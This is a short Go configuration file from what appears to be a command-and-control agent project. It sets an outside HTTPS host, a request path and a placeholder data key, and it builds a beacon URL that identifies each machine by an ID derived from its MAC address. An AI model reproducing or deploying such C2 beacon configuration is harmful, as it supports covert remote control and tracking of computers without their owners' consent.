package c2Data

import (
  util "github.com/acheong08/C2_Agent/utilities"
  "runtime"
)

/* Global constants as configuration */
const HttpVer = "https"
const Host string = "eggshell.duti.tech"
const Request_path = "/unique.html"
const Session_param string = "sessionid"
const DataKey string = "YouShouldChangeThis"
const Local_OS = runtime.GOOS

/* Variables required */
var Sessionid string
var Req_url string

/* Initialize variable configuration */
func init(){
  Sessionid = util.MacUint64()
  Req_url = HttpVer + "://" +  Host + Request_path + "?" + Session_param + "=" + Sessionid
}
